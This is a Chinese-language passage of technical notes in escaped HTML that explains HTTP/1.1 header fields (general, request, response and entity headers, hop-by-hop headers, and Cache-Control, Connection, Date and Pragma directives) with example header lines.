&lt;h5 id=&#34;通用首部字段&#34;&gt;&lt;a href=&#34;#通用首部字段&#34; class=&#34;headerlink&#34; title=&#34;通用首部字段&#34;&gt;&lt;/a&gt;通用首部字段&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Cache-Control&lt;/td&gt;
&lt;td&gt;控制缓存的行为&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Connection&lt;/td&gt;
&lt;td&gt;逐跳首部、连接的管理&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Date&lt;/td&gt;
&lt;td&gt;创建报文的日期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Pragma&lt;/td&gt;
&lt;td&gt;报文指令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Trailer&lt;/td&gt;
&lt;td&gt;报文末端的首部一览&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Transfer-Encoding&lt;/td&gt;
&lt;td&gt;指定报文主体的传输编码方式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Upgrade&lt;/td&gt;
&lt;td&gt;升级为其他协议&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Via&lt;/td&gt;
&lt;td&gt;代理服务器的相关信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Warning&lt;/td&gt;
&lt;td&gt;错误通知&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h5 id=&#34;请求首部字段&#34;&gt;&lt;a href=&#34;#请求首部字段&#34; class=&#34;headerlink&#34; title=&#34;请求首部字段&#34;&gt;&lt;/a&gt;请求首部字段&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Accept&lt;/td&gt;
&lt;td&gt;用户代理可处理的媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Charset&lt;/td&gt;
&lt;td&gt;优先的字符集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Encoding&lt;/td&gt;
&lt;td&gt;优先的内容编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Accept-Language&lt;/td&gt;
&lt;td&gt;优先的语言（自然语言）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Authorization&lt;/td&gt;
&lt;td&gt;Web认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Expect&lt;/td&gt;
&lt;td&gt;期待服务器的特定行为&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;From&lt;/td&gt;
&lt;td&gt;用户的电子邮箱地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Host&lt;/td&gt;
&lt;td&gt;请求资源所在服务器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Match&lt;/td&gt;
&lt;td&gt;比较实体标记（ETag）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Modified-Since&lt;/td&gt;
&lt;td&gt;比较资源的更新时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-None-Match&lt;/td&gt;
&lt;td&gt;比较实体标记（与 If-Match 相反）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Range&lt;/td&gt;
&lt;td&gt;资源未更新时发送实体 Byte 的范围请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;If-Unmodified-Since&lt;/td&gt;
&lt;td&gt;比较资源的更新时间（与If-Modified-Since相反）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Max-Forwards&lt;/td&gt;
&lt;td&gt;最大传输逐跳数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Proxy-Authorization&lt;/td&gt;
&lt;td&gt;代理服务器要求客户端的认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Range&lt;/td&gt;
&lt;td&gt;实体的字节范围请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Referer&lt;/td&gt;
&lt;td&gt;对请求中 URI 的原始获取方&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TE&lt;/td&gt;
&lt;td&gt;传输编码的优先级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;User-Agent&lt;/td&gt;
&lt;td&gt;HTTP  客户端程序的信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h5 id=&#34;响应首部字段&#34;&gt;&lt;a href=&#34;#响应首部字段&#34; class=&#34;headerlink&#34; title=&#34;响应首部字段&#34;&gt;&lt;/a&gt;响应首部字段&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Accept-Ranges&lt;/td&gt;
&lt;td&gt;是否接受字节范围请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Age&lt;/td&gt;
&lt;td&gt;推算资源创建经过时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ETag&lt;/td&gt;
&lt;td&gt;资源的匹配信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Location&lt;/td&gt;
&lt;td&gt;令客户端重定向至指定URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Proxy-Authenticate&lt;/td&gt;
&lt;td&gt;代理服务器对客户端的认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Retry-After&lt;/td&gt;
&lt;td&gt;对再次发起请求的时机要求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Server&lt;/td&gt;
&lt;td&gt;HTTP服务器的安装信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Vary&lt;/td&gt;
&lt;td&gt;代理服务器缓存的管理信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WWW-Authenticate&lt;/td&gt;
&lt;td&gt;服务器对客户端的认证信息&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h5 id=&#34;实体首部字段&#34;&gt;&lt;a href=&#34;#实体首部字段&#34; class=&#34;headerlink&#34; title=&#34;实体首部字段&#34;&gt;&lt;/a&gt;实体首部字段&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;首部字段名&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Allow&lt;/td&gt;
&lt;td&gt;资源可支持的HTTP方法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Encoding&lt;/td&gt;
&lt;td&gt;实体主体适用的编码方式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Language&lt;/td&gt;
&lt;td&gt;实体主体的自然语言&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Length&lt;/td&gt;
&lt;td&gt;实体主体的大小（单位：字节）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Location&lt;/td&gt;
&lt;td&gt;替代对应资源的URI&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-MD5&lt;/td&gt;
&lt;td&gt;实体主体的报文摘要&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Range&lt;/td&gt;
&lt;td&gt;实体主体的位置范围&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Content-Type&lt;/td&gt;
&lt;td&gt;实体主体的媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Expires&lt;/td&gt;
&lt;td&gt;实体主体过期的日期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Last-Modified&lt;/td&gt;
&lt;td&gt;资源的最后修改日期时间&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;非-HTTP-1-1-首部字段&#34;&gt;&lt;a href=&#34;#非-HTTP-1-1-首部字段&#34; class=&#34;headerlink&#34; title=&#34;非 HTTP/1.1 首部字段&#34;&gt;&lt;/a&gt;非 &lt;strong&gt;HTTP/1.1&lt;/strong&gt; 首部字段&lt;/h4&gt;&lt;p&gt;RFC4229&lt;/p&gt;
&lt;p&gt;Cookie、Set-Cookie 和 Content-Disposition 等&lt;/p&gt;
&lt;h4 id=&#34;End-to-end-首部和-Hop-by-hop-首部&#34;&gt;&lt;a href=&#34;#End-to-end-首部和-Hop-by-hop-首部&#34; class=&#34;headerlink&#34; title=&#34;End-to-end 首部和 Hop-by-hop 首部&#34;&gt;&lt;/a&gt;&lt;strong&gt;End-to-end&lt;/strong&gt; 首部和 &lt;strong&gt;Hop-by-hop&lt;/strong&gt; 首部&lt;/h4&gt;&lt;h5 id=&#34;端到端首部（End-to-end-Header）&#34;&gt;&lt;a href=&#34;#端到端首部（End-to-end-Header）&#34; class=&#34;headerlink&#34; title=&#34;端到端首部（End-to-end Header）&#34;&gt;&lt;/a&gt;端到端首部（&lt;strong&gt;End-to-end Header&lt;/strong&gt;）&lt;/h5&gt;&lt;p&gt;分在此类别中的首部会转发给请求 / 响应对应的最终接收目标，且必须保存在由缓存生成的响应中，另外规定它必须被转发。&lt;/p&gt;
&lt;h5 id=&#34;逐跳首部（Hop-by-hop-Header）&#34;&gt;&lt;a href=&#34;#逐跳首部（Hop-by-hop-Header）&#34; class=&#34;headerlink&#34; title=&#34;逐跳首部（Hop-by-hop Header）&#34;&gt;&lt;/a&gt;逐跳首部（&lt;strong&gt;Hop-by-hop Header&lt;/strong&gt;）&lt;/h5&gt;&lt;p&gt;分在此类别中的首部只对单次转发有效，会因通过缓存或代理而不再转发。HTTP/1.1 和之后版本中，如果要使用 hop-by-hop 首部，需提供 Connection 首部字段。&lt;/p&gt;
&lt;p&gt;除了一下8种其他全是端到端首部&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Connection&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Keep-Alive&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Proxy-Authenticate&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Proxy-Authorization&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Trailer&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Transfer-Encoding&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Upgrade&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;HTTP-1-1-通用首部字段&#34;&gt;&lt;a href=&#34;#HTTP-1-1-通用首部字段&#34; class=&#34;headerlink&#34; title=&#34;HTTP/1.1 通用首部字段&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTP/1.1&lt;/strong&gt; 通用首部字段&lt;/h3&gt;&lt;p&gt;通用首部字段是指，请求报文和响应报文双方都会使用的首部。&lt;/p&gt;
&lt;h4 id=&#34;Cache-Control&#34;&gt;&lt;a href=&#34;#Cache-Control&#34; class=&#34;headerlink&#34; title=&#34;Cache-Control&#34;&gt;&lt;/a&gt;&lt;strong&gt;Cache-Control&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;首部字段 &lt;strong&gt;Cache-Control&lt;/strong&gt; 能够控制缓存的行为&lt;/p&gt;
&lt;p&gt;写法&lt;code&gt;Cache-Control: private, max-age=0, no-cache&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;缓存请求指令&#34;&gt;&lt;a href=&#34;#缓存请求指令&#34; class=&#34;headerlink&#34; title=&#34;缓存请求指令&#34;&gt;&lt;/a&gt;缓存请求指令&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;no-cache&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;强制向源服务器再次验证&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-store&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;不缓存请求或响应的任何内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;max-age  = [ 秒]&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;响应的最大Age值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;max-stale( = [ 秒])&lt;/td&gt;
&lt;td&gt;可省略&lt;/td&gt;
&lt;td&gt;接收已过期的响应&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;min-fresh  = [ 秒]&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;期望在指定时间内的响应仍有效&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-transform&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;代理不可更改媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;only-if-cached&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;从缓存获取资源&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cache-extension&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;新指令标记（token）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h5 id=&#34;缓存响应指令&#34;&gt;&lt;a href=&#34;#缓存响应指令&#34; class=&#34;headerlink&#34; title=&#34;缓存响应指令&#34;&gt;&lt;/a&gt;缓存响应指令&lt;/h5&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;public&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;可向任意方提供响应的缓存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;private&lt;/td&gt;
&lt;td&gt;可省略&lt;/td&gt;
&lt;td&gt;仅向特定用户返回响应&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-cache&lt;/td&gt;
&lt;td&gt;可省略&lt;/td&gt;
&lt;td&gt;缓存前必须先确认其有效性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-store&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;不缓存请求或响应的任何内容&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;no-transform&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;代理不可更改媒体类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;must-revalidate&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;可缓存但必须再向源服务器进行确认&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;proxy-revalidate&lt;/td&gt;
&lt;td&gt;无&lt;/td&gt;
&lt;td&gt;要求中间缓存服务器对缓存的响应有效性再进行确认&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;max-age = [ 秒]&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;响应的最大Age值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;s-maxage  = [ 秒]&lt;/td&gt;
&lt;td&gt;必需&lt;/td&gt;
&lt;td&gt;公共缓存服务器响应的最大Age值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cache-extension&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;td&gt;新指令标记（token）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h5 id=&#34;表示是否能缓存的指令&#34;&gt;&lt;a href=&#34;#表示是否能缓存的指令&#34; class=&#34;headerlink&#34; title=&#34;表示是否能缓存的指令&#34;&gt;&lt;/a&gt;表示是否能缓存的指令&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: public&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当指定使用 public 指令时，则明确表明其他用户也可利用缓存。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: private&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当指定 private 指令后，响应只以特定的用户作为对象，这与 public指令的行为相反。&lt;/p&gt;
&lt;p&gt;缓存服务器会对该特定用户提供资源缓存的服务，对于其他用户发送过来的请求，代理服务器则不会返回缓存。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: no-cache&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 no-cache 指令的目的是为了防止从缓存中返回过期的资源。 &lt;/p&gt;
&lt;p&gt;客户端发送的请求中如果包含 no-cache 指令，则表示客户端将不会接收缓存过的响应。于是，“中间”的缓存服务器必须把客户端请求转发给源服务器。中间缓存服务器不缓存，相当于隧道不对报文做文章。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: no-cache=Location&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;控制可执行缓存的对象的指令&#34;&gt;&lt;a href=&#34;#控制可执行缓存的对象的指令&#34; class=&#34;headerlink&#34; title=&#34;控制可执行缓存的对象的指令&#34;&gt;&lt;/a&gt;控制可执行缓存的对象的指令&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: no-store&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当使用 no-store 指令时，暗示请求（和对应的响应）或响应中包含机密信息。&lt;/p&gt;
&lt;p&gt;该指令规定缓存不能在本地存储请求或响应的任一部分。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;指定缓存期限和认证的指令&#34;&gt;&lt;a href=&#34;#指定缓存期限和认证的指令&#34; class=&#34;headerlink&#34; title=&#34;指定缓存期限和认证的指令&#34;&gt;&lt;/a&gt;指定缓存期限和认证的指令&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: s-maxage=604800（单位 ：秒）&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s- maxage 指令只适用于供多位用户使用的公共缓存服务器 。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。&lt;/p&gt;
&lt;p&gt;当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及max-age 指令的处理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: max-age=604800（单位：秒）&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。&lt;/p&gt;
&lt;p&gt;当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的有效性再作确认，而 max-age 数值代表资源保存为缓存的最长时间。&lt;/p&gt;
&lt;p&gt;应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: min-fresh=60（单位：秒）&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: max-stale=3600（单位：秒）&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 max-stale 可指示缓存资源，即使过期也照常接收。&lt;/p&gt;
&lt;p&gt;如果指令未指定参数值，那么无论经过多久，客户端都会接收响应； 如果指令中指定了具体数值，那么即使过期，只要仍处于 max-stale 指定的时间内，仍旧会被客户端接收。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: only-if-cached&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: must-revalidate&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 must-revalidate 指令，代理会向源服务器再次验证即将返回的响应缓存目前是否仍然有效。&lt;/p&gt;
&lt;p&gt;若代理无法连通源服务器再次获取有效资源的话，缓存必须给客户端一条 504（Gateway Timeout）状态码。&lt;/p&gt;
&lt;p&gt;另外，使用 must-revalidate 指令会忽略请求的 max-stale 指令（即使已经在首部使用了 max-stale，也不会再有效果）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: proxy-revalidate&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;proxy-revalidate 指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Cache-Control: no-transform&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。&lt;/p&gt;
&lt;p&gt;这样做可防止缓存或代理压缩图片等类似操作。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;Cache-Control-扩展&#34;&gt;&lt;a href=&#34;#Cache-Control-扩展&#34; class=&#34;headerlink&#34; title=&#34;Cache-Control 扩展&#34;&gt;&lt;/a&gt;Cache-Control 扩展&lt;/h5&gt;&lt;p&gt;&lt;code&gt;Cache-Control: private, community=&#34;UCI&#34;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过 cache-extension 标记（token），可以扩展 Cache-Control 首部字段内的指令。&lt;/p&gt;
&lt;p&gt;如上例，Cache-Control 首部字段本身没有 community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理解community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。&lt;/p&gt;
&lt;h4 id=&#34;Connection&#34;&gt;&lt;a href=&#34;#Connection&#34; class=&#34;headerlink&#34; title=&#34;Connection&#34;&gt;&lt;/a&gt;Connection&lt;/h4&gt;&lt;h5 id=&#34;作用&#34;&gt;&lt;a href=&#34;#作用&#34; class=&#34;headerlink&#34; title=&#34;作用&#34;&gt;&lt;/a&gt;作用&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;控制不再转发给代理的首部字段&lt;code&gt;Connection: 不再转发的首部字段名&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/f6aa486e881b027e5f4c0eae92b1bf92.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;管理持久连接&lt;/p&gt;
&lt;p&gt;HTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。&lt;code&gt;Connection: Keep-Alive&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/fa4c471298769a15944259a15361652e.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。&lt;code&gt;Connection: close&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Date&#34;&gt;&lt;a href=&#34;#Date&#34; class=&#34;headerlink&#34; title=&#34;Date&#34;&gt;&lt;/a&gt;Date&lt;/h4&gt;&lt;p&gt;首部字段 Date 表明创建 HTTP 报文的日期和时间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;HTTP/1.1 协议使用在 RFC1123 中规定的日期时间的格式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Date: Tue, 03 Jul 2012 04:40:59 GMT&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;之前的 HTTP 协议版本中使用在 RFC850 中定义的格式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Date: Tue, 03-Jul-12 04:40:59 GMT&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;C 标准库内的 asctime() 函数的输出格式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Date: Tue Jul 03 04:40:59 2012&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;Pragma&#34;&gt;&lt;a href=&#34;#Pragma&#34; class=&#34;headerlink&#34; title=&#34;Pragma&#34;&gt;&lt;/a&gt;Pragma&lt;/h4&gt;&lt;p&gt;Pragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。相当于HTTP/1.1之后Cache-Control&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Pragma: no-cache&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Cache-Control&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;no-cache &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Pragma&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;no-cache&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通常一起用，因为你不能掌握全部中间服务器&lt;/p&gt;
